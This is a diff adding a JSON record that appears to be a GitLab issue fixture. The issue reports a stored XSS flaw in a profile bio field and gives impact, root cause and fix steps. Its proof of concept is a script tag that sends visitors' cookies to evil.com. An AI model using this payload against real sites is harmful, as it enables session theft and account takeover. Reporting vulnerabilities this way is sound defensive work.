@@ -1,0 +1,29 @@
+{
+  "id": 789012,
+  "iid": 301,
+  "project_id": 42,
+  "title": "XSS vulnerability in user profile bio field — unsanitized HTML rendered",
+  "description": "## Security Vulnerability Report\n\n**Severity:** Critical  \n**Reported by:** Security Audit Team  \n**CVE:** Pending assignment\n\n### Summary\nThe user profile bio field allows arbitrary HTML injection that is rendered unescaped in the activity feed and on public profile pages. This is a stored XSS vulnerability.\n\n### Proof of Concept\nSetting bio to: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`\n\nVisiting the profile page executes the script in visitor browsers.\n\n### Impact\n- Session hijacking for any user who views the malicious profile\n- Account takeover via stolen session cookies\n- Affects all users on public profiles (potentially thousands)\n\n### Root Cause\nThe bio field was recently updated to support 'rich text' (PR !2045). The sanitizer was applied on input but not on render. Template change in `views/profile/_bio.html.haml` removed the `h()` escape helper.\n\n### Recommended Fix\n1. Immediately disable rich text rendering on bio field\n2. Re-apply HTML escaping on render path\n3. Audit all other user-controlled fields for similar issues\n4. Invalidate all active sessions as precaution\n\n### Timeline\n- 2026-06-26 18:00 — Vulnerability introduced via PR !2045\n- 2026-06-27 08:30 — Identified during internal security scan\n- 2026-06-27 09:00 — Reported to security team\n- 2026-06-27 09:15 — Issue created (CONFIDENTIAL)",
+  "state": "opened",
+  "created_at": "2026-06-27T09:15:00.000Z",
+  "updated_at": "2026-06-27T10:00:00.000Z",
+  "closed_at": null,
+  "labels": [
+    "severity::critical",
+    "priority::urgent",
+    "security",
+    "xss",
+    "vulnerability",
+    "component::user-profiles",
+    "environment::production",
+    "regression"
+  ],
+  "assignees": [
+    { "id": 55, "name": "Security Team Lead", "username": "sec-lead" }
+  ],
+  "author": { "id": 10, "name": "Security Bot", "username": "security-scanner" },
+  "milestone": { "id": 8, "title": "Security Hotfix 2026-06" },
+  "web_url": "https://gitlab.com/myorg/myapp/-/issues/301",
+  "confidential": true,
+  "discussion_locked": false
+}
